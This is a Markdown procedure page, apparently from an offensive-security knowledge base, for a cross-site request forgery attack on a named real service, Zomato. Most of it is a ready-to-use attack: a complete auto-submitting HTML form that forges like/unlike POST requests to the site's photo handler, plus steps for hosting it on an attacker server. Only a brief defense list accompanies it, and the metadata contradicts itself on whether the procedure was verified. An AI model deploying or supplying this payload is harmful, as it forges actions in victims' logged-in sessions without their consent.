---
id: p2b3c4d5-e6f7-8901-bcde-f2345678901
tags:
  - csrf
  - html
  - javascript
type: procedure
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:23.319Z'
skill_level: intermediate
impact_level: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Create-Malicious-HTML-Form-for-CSRF

## Summary

This procedure creates a simple HTML page with an auto-submitting form that exploits Zomato's missing CSRF token validation to forge POST requests for liking or unliking photos.

## Description

The attack leverages a basic HTML form posting to `https://www.zomato.com/php/photoViewerActionsHandler.php` with parameters `type` (LIKE_PHOTO or UNLIKE_PHOTO) and `photo_id`. A JavaScript onload event submits the form automatically when the page loads in the victim's browser. This must be hosted on an attacker-controlled server. Prerequisites: Extracted photo_id, local web server. Expected outcomes: Forged request execution under victim's session.

## Requirements

1. Text editor for HTML/JS
2. Local web server (e.g., `python -m http.server`)
3. Extracted photo_id from prior step

## Defense

Defensive measures and detection strategies:

- Enforce CSRF tokens on all state-changing endpoints
- Monitor for cross-origin POST requests to internal handlers
- Use Content Security Policy to block inline scripts

## Objectives

1. Construct a stealthy CSRF payload
2. Automate form submission to avoid user interaction
3. Target Zomato's vulnerable PHP endpoint

## Instructions

### Step 1: Write the HTML Form

**Context**: Define the form structure with hidden fields.

Create `index.html`:

```html
<!DOCTYPE html>
<html>
<body>
<form id="csrfForm" action="https://www.zomato.com/php/photoViewerActionsHandler.php" method="POST">
    <input type="hidden" name="type" value="LIKE_PHOTO">
    <input type="hidden" name="photo_id" value="r_2MzMzNTg1NzIwO">
</form>
<script>
    document.getElementById('csrfForm').submit();
</script>
</body>
</html>
```

**Expected Output**: Valid HTML file with form and auto-submit script.

### Step 2: Host the Page

**Context**: Serve the file to make it accessible via URL.

Run a local server: `python -m http.server 8000` in the directory, access via `http://attacker-ip:8000`.

**Expected Output**: Page loads and submits form on visit.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[html]]
